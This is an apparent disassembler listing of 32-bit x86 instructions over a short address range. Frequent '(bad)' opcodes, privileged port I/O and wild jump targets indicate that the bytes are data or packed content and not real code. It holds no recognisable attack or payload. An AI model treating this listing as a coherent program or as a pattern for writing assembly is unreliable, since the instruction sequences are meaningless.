  426059:	lods   eax,DWORD PTR cs:[esi]
  42605b:	test   DWORD PTR [ebp-0xb],esi
  42605e:	stc    
  42605f:	scas   al,BYTE PTR es:[edi]
  426060:	pop    eax
  426061:	dec    esp
  426062:	add    eax,DWORD PTR [eax]
  426064:	jbe    0x4260e1
  426066:	(bad)  
  426067:	jg     0x4260bd
  426069:	sbb    al,0x3
  42606b:	add    BYTE PTR [ebp+0x8877311],cl
  426071:	nop
  426072:	or     BYTE PTR [ecx+0x46],dh
  426075:	in     al,0x45
  426077:	add    al,0x74
  426079:	std    
  42607a:	(bad)  
  42607b:	cmp    eax,0x12c08e10
  426080:	not    DWORD PTR [ebp+0x56]
  426083:	mov    esp,0x10289c23
  426088:	sbb    DWORD PTR [ebp-0x65a8b002],0x4d
  42608f:	push   esp
  426090:	push   ss
  426091:	or     eax,0xf4c47f01
  426096:	pop    edi
  426097:	xchg   DWORD PTR [edi-0x7f82c2bf],edi
  42609d:	sub    BYTE PTR [ebp+0x0],bl
  4260a0:	add    BYTE PTR [edi-0x70],ch
  4260a3:	nop
  4260a4:	out    0x6e,eax
  4260a6:	or     eax,0xe97ffc52
  4260ab:	dec    ebx
  4260ac:	mov    BYTE PTR [edi-0x78],dh
  4260af:	add    eax,DWORD PTR [eax]
	...
  4260c9:	add    ah,dh
  4260cb:	fisub  DWORD PTR [eax+ecx*4]
  4260ce:	hlt    
  4260cf:	adc    eax,0xe2f5fcc8
  4260d4:	push   ebx
  4260d5:	inc    ebp
  4260d6:	ins    DWORD PTR es:[edi],dx
  4260d7:	mov    DWORD PTR [eax+0x38],ecx
  4260da:	inc    edi
  4260db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260dc:	add    eax,DWORD PTR [eax]
  4260de:	hlt    
  4260df:	mov    DWORD PTR [ecx+0x7f],esi
  4260e2:	jmp    0xfbb661fd
  4260e7:	ror    BYTE PTR [ebp-0x19],cl
  4260ea:	and    cl,ch
  4260ec:	push   ecx
  4260ed:	cld    
  4260ee:	push   ebx
  4260ef:	imul   edx,DWORD PTR [esp+edi*8-0x1f],0xf43ff257
  4260f7:	rol    edi,1
  4260f9:	cld    
  4260fa:	fwait
  4260fb:	gs cmp eax,ecx
  4260fe:	clc    
  4260ff:	pop    ebx
  426100:	mov    bh,0x88
  426102:	sbb    bl,bl
  426104:	pop    esp
  426105:	and    eax,edi
  426107:	add    eax,0x9a75e7b7
  42610c:	add    eax,DWORD PTR [eax]
  42610e:	jg     0x4260a4
  426110:	js     0x42616c
  426112:	add    al,0xe1
  426114:	sub    dh,BYTE PTR [edx-0x5]
  426117:	dec    ecx
  426118:	inc    eax
  426119:	out    0x6f,al
  42611b:	pop    esp
  42611c:	add    BYTE PTR [eax],al
  42611e:	ja     0x426130
  426120:	hlt    
  426121:	(bad)  
  426122:	jle    0x426136
  426124:	or     dh,al
  426126:	cmp    DWORD PTR ds:0xf76704a6,eax
  42612c:	imul   eax,edi,0x0
	...
  426147:	scas   eax,DWORD PTR es:[edi]
  426148:	pop    esp
  426149:	in     eax,dx
  42614a:	test   eax,0xc75b45cb
  42614f:	lahf   
  426150:	jnp    0x42617d
  426152:	hlt    
  426153:	ins    BYTE PTR es:[edi],dx
  426154:	mov    edi,0xf52650ee
  426159:	popa   
  42615a:	xchg   esp,eax
  42615b:	jg     0x426160
  42615d:	out    0x3,eax
  42615f:	mov    WORD PTR [edi],fs
  426161:	cs push ecx
  426163:	cwde   
  426164:	jg     0x4261c3
  426166:	sar    BYTE PTR [edx+eax*4],cl
  426169:	retf   
  42616a:	dec    ebx
  42616b:	mov    edi,DWORD PTR [ebx+ecx*8+0x57]
  42616f:	ins    BYTE PTR es:[edi],dx
  426170:	add    edx,ebp
  426172:	mov    BYTE PTR [ebx-0x19af1926],0xe8
  426179:	xor    eax,0xb34603d7
  42617e:	mul    DWORD PTR [eax-0x31]
  426181:	not    BYTE PTR [eax-0x1a]
  426184:	clc    
  426185:	push   cs
  426186:	mov    ah,0x4d
  426188:	add    al,0xe7
  42618a:	jl     0x4261e7
  42618c:	jg     0x4261a2
  42618e:	fcomp  st(5)
  426190:	jns    0x426115
  426192:	sti    
  426193:	ins    BYTE PTR es:[edi],dx
  426194:	es push cs
  426196:	ret    
  426197:	xor    DWORD PTR [ebp-0xb],eax
  42619a:	xchg   DWORD PTR [ebx-0x30],ebp
  42619d:	loop   0x4261e8
  42619f:	mov    dh,0x45
  4261a1:	out    0x5b,eax
  4261a3:	or     BYTE PTR [ebp+ebx*8-0x295883b0],dl
  4261aa:	test   BYTE PTR [eax],al
	...
  4261c4:	mov    dh,0x4c
  4261c6:	push   cs
  4261c7:	push   ecx
  4261c8:	scas   al,BYTE PTR es:[edi]
  4261c9:	push   eax
  4261ca:	cmp    edx,DWORD PTR [eax-0x3630ef08]
  4261d0:	nop
  4261d1:	add    eax,0x2ca0e900
  4261d6:	aas    
  4261d7:	dec    esi
  4261d8:	test   DWORD PTR [edx+ecx*4],0x5de1452c
  4261df:	inc    edx
  4261e0:	cmovbe edx,DWORD PTR [edi]
  4261e3:	jmp    0x6b2def6a
  4261e8:	and    edx,DWORD PTR [eax]
  4261ea:	or     DWORD PTR [esp],0x31165144
  4261f1:	mov    edi,0x8cdf6207
  4261f6:	test   BYTE PTR [ecx-0xa],bl
  4261f9:	add    al,0x0
  4261fb:	jo     0x4261af
  4261fd:	cmp    BYTE PTR [eax+0x428b8faa],cl
  426203:	push   ecx
  426204:	das    
  426205:	xor    dl,bh
  426207:	dec    esi
  426208:	and    al,0x88
  42620a:	mov    edi,0x724143bd
  42620f:	in     eax,dx
  426210:	lock (bad) 
  426212:	sti    
  426213:	fnstenv [edi]
  426215:	inc    esp
  426216:	jmpw   0x28fc
  42621a:	repz mov ecx,0x36fd0639
  426220:	js     0x42625e
  426222:	(bad)  
  426223:	fwait
  426224:	loopne 0x4261ab
  426226:	js     0x426205
	...
  426240:	add    bh,dh
  426242:	mov    bh,0x1a
  426244:	jb     0x426276
  426246:	mov    ah,0xfc
  426248:	je     0x42627d
  42624a:	lea    edi,[edi]
  42624c:	loope  0x4261fc
  42624e:	(bad)  
  42624f:	test   DWORD PTR [ebx-0x22bd7009],0xde01ae60
  426259:	retf   
  42625a:	inc    BYTE PTR [ecx]
  42625c:	call   0xe7b56758
  426261:	jbe    0x426232
  426263:	sti    
  426264:	add    BYTE PTR [edx],dh
  426266:	loopne 0x42626e
  426268:	xor    esp,DWORD PTR [ecx+ecx*2+0x828c137]
  42626f:	test   DWORD PTR [ebp-0x6f],ecx
  426272:	ja     0x4261fb
  426274:	pop    ebp
  426275:	in     eax,0xdf
  426277:	adc    al,0xfe
  426279:	jb     0x42624e
  42627b:	xchg   DWORD PTR [ebp+0x61],eax
  42627e:	jae    0x4262d7
  426280:	leave  
  426281:	pop    DWORD PTR [eax-0x4]
  426284:	push   esp
  426285:	inc    esi
  426286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426287:	jg     0x426275
  426289:	fnsave [edi+0x52]
  42628c:	mov    ebp,DWORD PTR ds:0x2a1042c0
  426292:	icebp  
  426293:	pop    ss
  426294:	shl    BYTE PTR [eax],0x83
  426297:	adc    ah,BYTE PTR [ebx]
  426299:	fdivr  QWORD PTR [ebx+0x7f]
  42629c:	rol    BYTE PTR [ebp-0x25511b89],0x8
  4262a3:	add    BYTE PTR [eax+eax*1+0x0],al
	...
  4262be:	int    0x5c
  4262c0:	add    esi,DWORD PTR [edx]
  4262c2:	sbb    eax,0x5d018fe2
  4262c7:	pop    es
  4262c8:	mov    DWORD PTR [ebp+0xd],edi
  4262cb:	rol    dl,0xe8
  4262ce:	rol    DWORD PTR [eax],1
  4262d0:	std    
  4262d1:	(bad)  
  4262d2:	jnp    0x42625a
  4262d4:	jns    0x4262b6
  4262d6:	pop    ebp
  4262d7:	(bad)  
  4262d8:	or     al,0x27
  4262da:	dec    ebp
  4262db:	pop    es
  4262dc:	mov    ch,0x30
  4262de:	mov    eax,0x21740007
  4262e3:	sub    DWORD PTR ds:0xd456fd45,esi
  4262e9:	fs inc sp
  4262ec:	fdiv   QWORD PTR [edi+0x5f]
  4262ef:	sub    DWORD PTR [edi+0x7d],edi
  4262f2:	sub    DWORD PTR [edi],eax
  4262f4:	je     0x426302
  4262f6:	hlt    
  4262f7:	ror    DWORD PTR [edx],cl
  4262f9:	inc    ebx
  4262fa:	or     bh,bl
  4262fc:	inc    esi
  4262fd:	gs mov ebp,0xb37457f8
  426303:	mov    bh,0xcf
  426305:	pop    es
  426306:	jns    0x4262bb
  426308:	je     0x426308
  42630a:	jecxz  0x426338
  42630c:	mov    al,0xc5
  42630e:	xor    DWORD PTR [edi+0x0],esp
  426311:	(bad)  
  426312:	cmp    DWORD PTR [ebp+0x3],esp
  426315:	std    
  426316:	loope  0x42636b
  426318:	repz aas 
  42631a:	hlt    
  42631b:	test   al,0x40
  42631d:	or     al,0x61
  42631f:	icebp  
  426320:	dec    ecx
  426321:	out    0x0,eax
	...
  42633b:	lds    ebp,FWORD PTR [eax+eax*1+0x0]
  42633f:	jg     0x4262d5
  426341:	xchg   eax,ebx
  426343:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426345:	cmp    edi,0x427f2c9b
  42634b:	mov    esp,0x9cf0797c
  426350:	pop    esp
  426351:	inc    edi
  426352:	inc    DWORD PTR [ebx-0x4788bf57]
  426358:	mov    dh,0x50
  42635a:	push   0x3101046a
  42635f:	je     0x4263da
  426361:	inc    esi
  426362:	push   DWORD PTR [eax+0x71]
  426365:	inc    eax
  426366:	jae    0x426360
  426368:	xchg   ebp,eax
  426369:	add    BYTE PTR [ecx+0x5c],dl
  42636c:	mov    DWORD PTR [ecx-0x1],0xdc66044b
  426373:	hlt    
  426374:	sub    edi,DWORD PTR [ecx-0x38]
  426377:	ins    DWORD PTR es:[edi],dx
  426378:	jb     0x42637e
  42637a:	call   0x434fa5
  42637f:	jl     0x4263f2
  426381:	dec    ecx
  426382:	call   0x5145e976
  426387:	or     al,0x5
  426389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42638a:	inc    ecx
  42638b:	adc    eax,DWORD PTR [edx+0x6e]
  42638e:	mov    DWORD PTR [edx],0xcfc538e
  426394:	out    dx,al
  426395:	iretw  
  426397:	std    
  426398:	add    al,0x3b
  42639a:	daa    
  42639b:	jne    0x42635a
  42639d:	loop   0x4263b0
	...
  4263b7:	add    BYTE PTR [edi+0x22],ch
  4263ba:	inc    ecx
  4263bb:	add    ebp,DWORD PTR [edi-0x39]
  4263be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263bf:	jns    0x42636d
  4263c1:	sub    al,0x9f
  4263c3:	inc    edx
  4263c4:	rol    DWORD PTR [ecx+0x62],cl
  4263c7:	inc    esp
  4263c8:	inc    edi
  4263c9:	adc    ah,BYTE PTR [edx+0x39]
  4263cc:	fstp   TBYTE PTR [esi-0x5a]
  4263cf:	add    al,0xf4
  4263d1:	mov    BYTE PTR [esi+0x234af7d8],ah
  4263d7:	dec    ecx
  4263d8:	stos   BYTE PTR es:[edi],al
  4263d9:	inc    edx
  4263da:	mov    ecx,0xe69f825b
  4263df:	add    eax,DWORD PTR [ebp+0x2d]
  4263e2:	sub    DWORD PTR [edi-0x6d],0x8dcf6641
  4263e9:	add    al,0xdb
  4263eb:	(bad)  
  4263ec:	outs   dx,BYTE PTR ds:[esi]
  4263ed:	mov    DWORD PTR [edx+0x3],esi
  4263f0:	hlt    
  4263f1:	add    al,0x97
  4263f3:	dec    esp
  4263f4:	push   es
  4263f5:	and    ecx,ebx
  4263f7:	ret    
  4263f8:	imul   eax,ecx,0xffffffb3
  4263fb:	dec    eax
  4263fc:	arpl   WORD PTR [ebp+0x2c5a93e5],si
  426402:	outs   dx,DWORD PTR ds:[esi]
  426403:	add    al,0xf4
  426405:	add    al,0x67
  426407:	iret   
  426408:	inc    edx
  426409:	add    al,0xe6
  42640b:	xchg   DWORD PTR [esi+0x42],edx
  42640e:	or     eax,0x8e896e4d
  426413:	add    dh,ah
  426415:	add    al,0x97
  426417:	jp     0x4263cf
  426419:	or     al,0x0
  42641b:	test   BYTE PTR [eax],0x0
	...
  426432:	add    BYTE PTR [eax],al
  426434:	add    BYTE PTR [edx],ch
  426436:	sbb    DWORD PTR [edx],edx
  426438:	test   eax,0xb1428df7
  42643d:	xchg   edx,eax
  42643e:	mov    al,ds:0x4f7e85f
  426443:	push   eax
  426444:	bound  esp,QWORD PTR [ecx+ebp*1+0x4f7a5aa]
  42644b:	sub    DWORD PTR [ecx-0x46771541],0xffffffcc
  426452:	cmp    dh,BYTE PTR [edi]
  426454:	jmp    0xbb5b:0x19ffab04
  42645b:	mov    edi,0xff45e191
  426460:	call   0x823b27b4
  426465:	sbb    BYTE PTR [edx-0x1],ah
  426468:	call   0x72462eab
  42646d:	xor    al,0x28
  42646f:	pop    eax
  426470:	test   al,0xf7
  426472:	add    al,0xe9
  426474:	sar    DWORD PTR [ebp+0x30248b3f],0x8d
  42647b:	enter  0x5f51,0x46
  42647f:	(bad)  
  426480:	call   0x6e3b2794
  426485:	aaa    
  426486:	mov    ah,0x12
  426488:	push   0xe8fea468
  42648d:	not    DWORD PTR [esi+edi*8+0x6bef7e8]
  426494:	cli    
  426495:	mov    bh,0x8c
  426497:	enter  0x41,0x0
	...
  4264af:	add    BYTE PTR [eax],al
  4264b1:	add    BYTE PTR [esi],bl
  4264b3:	inc    ebp
  4264b4:	(bad)  
  4264b5:	call   0x1e4a177a
  4264ba:	inc    edx
  4264bb:	sbb    al,0x12
  4264bd:	test   eax,0x12428af7
  4264c2:	mov    dl,ah
  4264c4:	pop    eax
  4264c5:	add    ah,ah
  4264c7:	lds    eax,FWORD PTR [eax]
  4264c9:	add    BYTE PTR [eax-0x67c1743],al
  4264cf:	jnp    0x426523
  4264d1:	lea    ecx,[esi+0x1dfffd5b]
  4264d7:	jae    0x426525
  4264d9:	(bad)  
  4264da:	ror    bl,1
  4264dc:	cld    
  4264dd:	mov    al,dl
  4264df:	fdivr  st,st(3)
  4264e1:	adc    eax,0x3c3a05
  4264e6:	out    dx,al
  4264e7:	ret    
  4264e8:	test   DWORD PTR [ebp-0x4b],eax
  4264eb:	adc    DWORD PTR [edi+0x64],edi
  4264ee:	int3   
  4264ef:	add    eax,DWORD PTR [eax]
  4264f1:	(bad)  
  4264f3:	or     bh,ch
  4264f5:	(bad)  
  4264f6:	ffree  st(0)
  4264f8:	inc    ecx
  4264f9:	hlt    
  4264fa:	inc    esi
  4264fb:	nop
  4264fc:	pop    esp
  4264fd:	add    ebp,ecx
  4264ff:	add    edi,edi
  426501:	jl     0x426564
  426503:	mov    edi,0x44280871
  426508:	add    al,0x50
  42650a:	test   DWORD PTR [edi],eax
  42650c:	les    eax,FWORD PTR [eax]
  42650e:	lea    eax,[esp+edi*4-0x341ebf1]
  426515:	inc    DWORD PTR [eax]
	...
  42652f:	popf   
  426530:	aad    0x41
  426532:	or     al,0x9c
  426534:	push   esp
  426535:	or     BYTE PTR [ebx+0x47487d3],cl
  42653b:	fistp  QWORD PTR [ebx]
  42653d:	mov    DWORD PTR [ecx-0x9fffca3],edi
  426543:	nop
  426544:	aaa    
  426545:	(bad)  
  426546:	jae    0x426579
  426548:	popa   
  426549:	xor    al,0x8d
  42654b:	nop
  42654c:	mov    edx,DWORD PTR [ebx+0x50]
  42654f:	sbb    dh,BYTE PTR [esi]
  426551:	dec    eax
  426552:	push   ss
  426553:	popf   
  426554:	add    eax,DWORD PTR [edi-0x7aea0bbb]
  42655a:	ret    
  42655b:	call   0xf5a1e240
  426560:	sub    eax,0xeae7e800
  426565:	add    eax,DWORD PTR [eax]
  426567:	and    eax,eax
  426569:	push   eax
  42656a:	cld    
  42656b:	test   eax,0x86a8535
  426570:	in     eax,0x48
  426572:	adc    ch,al
  426574:	cmp    eax,eax
  426576:	jmp    FWORD PTR [esi-0x5e]
  426579:	cmp    dh,0xfb
  42657c:	sub    al,0xda
  42657e:	inc    DWORD PTR [eax+0x274f8bf1]
  426584:	ins    BYTE PTR es:[edi],dx
  426585:	pop    eax
  426586:	and    BYTE PTR [esi-0x4b7db68a],0xee
  42658d:	out    dx,eax
  42658e:	imul   esi,ebp,0xb7bfb8
	...
  4265ac:	jg     0x42661c
  4265ae:	pop    eax
  4265af:	jo     0x426566
  4265b1:	sub    al,0x0
  4265b3:	test   BYTE PTR [eax+ebx*1-0x78c63a00],dh
  4265ba:	add    edi,ebp
  4265bc:	and    DWORD PTR [ecx+ecx*2-0x3fa603ee],edi
  4265c3:	dec    DWORD PTR [esi+0x7effde1f]
  4265c9:	out    dx,eax
  4265ca:	jge    0x426599
  4265cc:	pushf  
  4265cd:	jns    0x426612
  4265cf:	inc    DWORD PTR [ebx-0x308cbf50]
  4265d5:	ret    0x891f
  4265d8:	shl    DWORD PTR [ebx],0x7d
  4265db:	out    dx,eax
  4265dc:	fcomip st,st(5)
  4265de:	or     BYTE PTR [ecx],al
  4265e0:	and    eax,0x4c4f0042
  4265e5:	retf   
  4265e6:	inc    ebx
  4265e7:	call   DWORD PTR [ebx+0x5]
  4265ea:	imul   eax,DWORD PTR [ebx-0x39],0x8
  4265ee:	and    eax,0x620440c0
  4265f3:	retf   0xfbf7
  4265f6:	mov    edi,?
  4265f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265f9:	add    eax,0x46f7c970
  4265fe:	mov    ds:0xab8b224a,eax
  426603:	dec    ebx
  426604:	outs   dx,BYTE PTR ds:[esi]
  426605:	mov    al,BYTE PTR [esi-0x30fb0bfc]
  42660b:	lahf   
  42660c:	xor    eax,0x48e705
	...
  426629:	scas   al,BYTE PTR es:[edi]
  42662a:	cmp    al,0x69
  42662c:	xlat   BYTE PTR ds:[ebx]
  42662d:	pop    es
  42662e:	std    
  42662f:	int    0xbf
  426631:	jmp    0x4265bc
  426633:	sub    ecx,DWORD PTR [esp+esi*2-0x39]
  426637:	mov    dl,0xc
  426639:	sbb    eax,0xf4034a82
  42663e:	add    al,0xde
  426640:	ja     0x426637
  426642:	cmp    eax,0xb7c849a5
  426647:	xchg   esi,eax
  426648:	dec    ecx
  426649:	out    0x20,al
  42664b:	stc    
  42664c:	ret    
  42664d:	mov    ebx,0xb3490bbd
  426652:	mov    cl,0xee
  426654:	jl     0x42668c
  426656:	or     eax,0x4602b8f
  42665b:	out    0x7d,eax
  42665d:	ss ds or eax,0xee42baaa
  426664:	add    ebx,DWORD PTR [esi]
  426666:	add    eax,0x373945e
  42666b:	out    0x3,eax
  42666d:	jns    0x426686
  42666f:	jmp    0x426665
  426671:	xor    eax,DWORD PTR ds:0x450c2c3e
  426677:	xor    eax,0xff7c342c
  42667c:	ficom  DWORD PTR [eax]
  42667e:	sti    
  42667f:	mov    eax,ds:0xeb8ca32a
  426684:	push   0xffffffd4
  426686:	xor    eax,0xbdc0d7e
  42668b:	add    cl,ch
	...
  4266a5:	add    BYTE PTR [eax-0x607eab29],al
  4266ab:	sti    
  4266ac:	(bad)  
  4266ad:	call   0xd53e9d5a
  4266b2:	inc    ebx
  4266b3:	adc    eax,DWORD PTR [eax-0x17]
  4266b6:	mov    ds:0xaf9923b1,al
  4266bb:	cmc    
  4266bc:	pusha  
  4266bd:	out    0xbc,al
  4266bf:	mov    WORD PTR [edx],?
  4266c1:	or     DWORD PTR [edx],ecx
  4266c3:	std    
  4266c4:	jmp    DWORD PTR [ebx+0x7b]
  4266c7:	loope  0x426698
  4266c9:	jmp    0xc6926bc5
  4266ce:	and    eax,0x7c05a385
  4266d3:	cmp    al,0xfc
  4266d5:	jmp    0x434215d1
  4266da:	div    ebp
  4266dc:	mov    edi,0xb7e85374
  4266e1:	jmp    0x55c96bdd
  4266e6:	(bad)  [edi+edi*8-0x18]
  4266ea:	imul   DWORD PTR [edx+edi*2]
  4266ed:	push   es
  4266ee:	cmp    eax,0xc1e96939
  4266f3:	push   es
  4266f4:	xor    DWORD PTR [ecx-0x5edc5fde],ebp
  4266fa:	test   DWORD PTR [eax+eax*1],0xfcb9a851
  426701:	pop    esi
  426702:	or     cl,al
  426704:	and    edi,DWORD PTR [ecx-0x7adc7802]
	...
  426722:	add    bh,dh
  426724:	add    al,0x0
  426726:	add    ah,ah
  426728:	jnp    0x42674a
  42672a:	adc    al,0xd0
  42672c:	jnp    0x42674e
  42672e:	sbb    BYTE PTR [ebp-0x41],bh
  426731:	mov    eax,0x87924
  426736:	add    ah,al
  426738:	inc    ebx
  426739:	and    BYTE PTR [edx+eiz*8],dl
  42673c:	cmc    
  42673d:	xchg   DWORD PTR ds:0x3c367d,ebx
  426743:	ja     0x426785
  426745:	das    
  426746:	mul    BYTE PTR [eax-0x74cbdf85]
  42674c:	js     0x426749
  42674e:	ror    DWORD PTR [esi+0x2d6a08fb],cl
  426754:	mov    bl,0x40
  426756:	and    al,0xd1
  426758:	push   0x4c
  42675a:	(bad)  
  42675b:	ds mov al,al
  42675e:	or     al,0xbb
  426760:	mov    ebp,0xb8e92440
  426765:	jo     0x42678b
  426767:	and    DWORD PTR [edx-0x2702db90],edi
  42676d:	or     dh,BYTE PTR [ebp+ecx*8+0x30c78707]
  426774:	xchg   ebp,eax
  426775:	and    al,ch
  426777:	fld    QWORD PTR [edi]
  426779:	add    al,ch
  42677b:	push   ebx
  42677c:	inc    edx
  42677d:	sti    
  42677e:	call   DWORD PTR [eax-0x7b]
  426781:	and    BYTE PTR [eax+0x3300079c],bl
	...
  42679f:	add    BYTE PTR [ebx],ch
  4267a1:	jno    0x426728
  4267a3:	mov    ah,0xb9
  4267a5:	(bad)  
  4267a6:	std    
  4267a7:	dec    DWORD PTR [ebp-0x1edb4f48]
  4267ad:	add    DWORD PTR [eax],eax
  4267af:	add    dl,bl
  4267b1:	test   BYTE PTR [eax],ah
  4267b3:	mov    ah,0x8c
  4267b5:	pop    es
  4267b6:	add    BYTE PTR [esp+esi*8+0x72ffc055],bl
  4267bd:	xor    BYTE PTR [eax],ah
  4267bf:	adc    dh,BYTE PTR [ebp+ebp*1+0x2df7e9d8]
  4267c6:	add    BYTE PTR [ebx-0x1bbf690],cl
  4267cc:	push   ebx
  4267cd:	sub    eax,0xfe4b4faa
  4267d2:	jbe    0x426757
  4267d4:	sbb    dl,cl
  4267d6:	add    eax,DWORD PTR [eax]
  4267d8:	hlt    
  4267d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267da:	jl     0x42685b
  4267dc:	cmc    
  4267dd:	sub    eax,0x49b08b00
  4267e2:	in     al,0x86
  4267e4:	jnp    0x426787
  4267e6:	add    al,BYTE PTR [eax]
  4267e8:	hlt    
  4267e9:	mov    al,ds:0x2d08237f
  4267ee:	add    BYTE PTR [eax],al
  4267f0:	ja     0x42685b
  4267f2:	hlt    
  4267f3:	xchg   BYTE PTR [ebx-0x4b],bh
  4267f6:	add    eax,DWORD PTR [eax]
  4267f8:	hlt    
  4267f9:	mov    al,ds:0x2d8c237c
  4267fe:	add    BYTE PTR [eax],al
  426800:	inc    ebx
  426801:	mov    ch,0x7d
  426803:	mov    eax,DWORD PTR [eax]
	...
  42681d:	cmc    
  42681e:	sub    eax,DWORD PTR [eax]
  426820:	call   0xfc87e4f1
  426825:	pop    esi
  426826:	and    al,0x58
  426828:	sbb    ch,BYTE PTR [esi+0x2c]
  42682b:	add    BYTE PTR [ebx-0x3b08ef4c],al
  426831:	hlt    
  426832:	pop    edi
  426833:	iret   
  426834:	aas    
  426835:	hlt    
  426836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426837:	enter  0x7f03,0xbc
  42683b:	pop    ecx
  42683c:	add    edi,esp
  42683e:	mov    cl,0x77
  426840:	inc    ebx
  426841:	rcr    BYTE PTR [ebx],1
  426843:	pop    esp
  426844:	mov    eax,0x8345aa98
  426849:	mov    ah,0x5
  42684b:	fdiv   st(2),st
  42684d:	ins    BYTE PTR es:[edi],dx
  42684e:	inc    edx
  42684f:	dec    esi
  426850:	int3   
  426851:	jns    0x42688d
  426853:	push   ebp
  426854:	jg     0x426809
  426856:	mov    al,0x1c
  426858:	fcmovne st,st(3)
  42685a:	cs out 0x3,al
  42685d:	and    eax,0x7078995e
  426862:	in     eax,0xe7
  426864:	add    esi,esp
  426866:	aam    0xdd
  426868:	lea    esi,[eax-0x3]
  42686b:	out    0x3,eax
  42686d:	hlt    
  42686e:	aam    0x1d
  426870:	lock aas 
  426872:	adc    eax,0x3d7503a7
  426877:	or     eax,0xe8f805cf
  42687c:	add    al,0xf4
  42687e:	add    al,0x73
  426880:	cli    
	...
  426899:	add    al,ch
  42689b:	jb     0x426902
  42689d:	or     edx,DWORD PTR [ebx]
  42689f:	cmp    ah,dh
  4268a1:	or     cl,BYTE PTR [ebx-0x49]
  4268a4:	imul   DWORD PTR [ebx+ebx*1-0x7ba2947]
  4268ab:	xchg   DWORD PTR [edx],ebp
  4268ad:	and    BYTE PTR [ebp+ebp*1-0x29],al
  4268b1:	jecxz  0x42689b
  4268b3:	cmp    ecx,edx
  4268b5:	mov    DWORD PTR [eax+ecx*4+0x65],ebp
  4268b9:	and    al,0xdb
  4268bb:	cmp    esi,esp
  4268bd:	or     BYTE PTR [ecx-0xbfc186c],al
  4268c3:	or     DWORD PTR [ebx+0x11],ebp
  4268c6:	ret    
  4268c7:	cmp    esi,esp
  4268c9:	js     0x42693b
  4268cb:	fsub   st,st(7)
  4268cd:	add    esi,esp
  4268cf:	std    
  4268d0:	sahf   
  4268d1:	iret   
  4268d2:	(bad)  
  4268d3:	std    
  4268d4:	test   eax,0xa58dfad0
  4268d9:	pop    esp
  4268da:	pop    edx
  4268db:	xor    eax,0x2d3975ff
  4268e0:	mov    fs,WORD PTR [ecx+0x5c]
  4268e3:	in     eax,0xb
  4268e5:	div    BYTE PTR [ecx-0x3b]
  4268e8:	and    ebp,ebp
  4268ea:	cld    
  4268eb:	test   DWORD PTR [ecx+eiz*8+0x120004f6],eax
  4268f2:	mov    ch,0xb5
  4268f4:	add    al,BYTE PTR [eax]
  4268f6:	mov    al,ds:0xb1d97401
  4268fb:	lds    esp,FWORD PTR [ebx]
  4268fd:	in     eax,0x0
	...
  426917:	ja     0x4268d6
  426919:	and    ebx,ebp
  42691b:	dec    ebx
  42691c:	mov    bl,0xdf
  42691e:	adc    BYTE PTR [eax+0x40e9fc39],ah
  426924:	outs   dx,DWORD PTR ds:[esi]
  426925:	inc    ebx
  426926:	int    0x2b
  426928:	mov    WORD PTR [ebx-0x3c5d79a],?
  42692e:	jmp    0x654e9d1f
  426933:	in     al,0x39
  426935:	cld    
  426936:	jmp    0x75662ec5
  42693b:	inc    edi
  42693c:	cmp    BYTE PTR [ebp-0xf],dh
  42693f:	mov    eax,0xade03af
  426944:	cmp    DWORD PTR [edx],edx
  426946:	sub    eax,edi
  426948:	cmp    DWORD PTR [edi-0x979522],0xffffffe8
  42694f:	imul   DWORD PTR [esi]
  426951:	inc    ebx
  426952:	add    eax,0xfa7400c4
  426957:	(bad)  
  426958:	cwde   
  426959:	and    esp,DWORD PTR [ebp-0x9]
  42695c:	add    al,0x0
  42695e:	not    BYTE PTR [edx+0x78]
  426961:	sub    DWORD PTR [ecx-0x166b7c40],0xfffffff7
  426968:	add    al,0xe9
  42696a:	frstor [edi-0x73]
  42696d:	test   BYTE PTR [eax],al
  42696f:	or     eax,0x85000003
  426974:	std    
  426975:	stos   BYTE PTR es:[edi],al
  426976:	dec    BYTE PTR [edx]
  426978:	scas   eax,DWORD PTR es:[edi]
  426979:	and    BYTE PTR [eax+eax*1],0x0
	...
  426991:	add    BYTE PTR [eax],al
  426993:	add    BYTE PTR [ebp+0x3d000003],ah
  426999:	mov    ebp,0x7784e8ca
  42699e:	cld    
  42699f:	inc    DWORD PTR [esi]
  4269a1:	(bad)  
  4269a2:	jno    0x426985
  4269a4:	ret    
  4269a5:	ja     0x4269c7
  4269a7:	je     0x4269f5
  4269a9:	dec    eax
  4269aa:	push   eax
  4269ab:	cmp    DWORD PTR [ecx+0x18],edi
  4269ae:	js     0x4269bf
  4269b0:	mov    al,0xc3
  4269b2:	add    al,0x80
  4269b5:	pop    eax
  4269b6:	xchg   DWORD PTR [esi],eax
  4269b8:	gs mov ah,0x1
  4269bb:	add    BYTE PTR [ebp-0x51],cl
  4269be:	mov    BYTE PTR [ecx+edi*4],ah
  4269c1:	ss cld 
  4269c3:	jmp    FWORD PTR [edi+ebp*4-0x78]
  4269c7:	and    al,0x2d
  4269c9:	add    eax,DWORD PTR [eax]
  4269cb:	add    BYTE PTR [ebp+edi*4-0x36],bh
  4269cf:	jmp    FWORD PTR [ebp+0x3c]
  4269d2:	aaa    
  4269d3:	ret    
  4269d4:	fwait
  4269d5:	sbb    cl,BYTE PTR [ecx+0x1a8f18c]
  4269db:	add    BYTE PTR ds:0x18c8951,cl
  4269e1:	in     eax,0xfc
  4269e3:	(bad)  
  4269e4:	fst    QWORD PTR [eax-0x1c]
  4269e7:	les    ebx,FWORD PTR [ebp-0x62750000]
  4269ed:	aaa    
  4269ee:	out    dx,eax
  4269ef:	je     0x4269cc
  4269f1:	xchg   dl,bl
  4269f3:	mov    edx,DWORD PTR [edx+0xf4b0e8]
	...
  426a11:	call   0xfbc4:0x274ee4c3
  426a18:	div    ah
  426a1a:	jmp    0x5738de06
  426a1f:	test   BYTE PTR [eax-0x7fbf815e],bl
  426a25:	sbb    BYTE PTR [edx-0x44],al
  426a28:	inc    DWORD PTR [edx]
  426a2a:	fld    DWORD PTR [ebx-0x7d]
  426a2d:	mov    ah,0x56
  426a2f:	test   dh,ch
  426a31:	sbb    BYTE PTR [esi+0x200fc40],0x10
  426a38:	mov    DWORD PTR [ebx-0x3b],edx
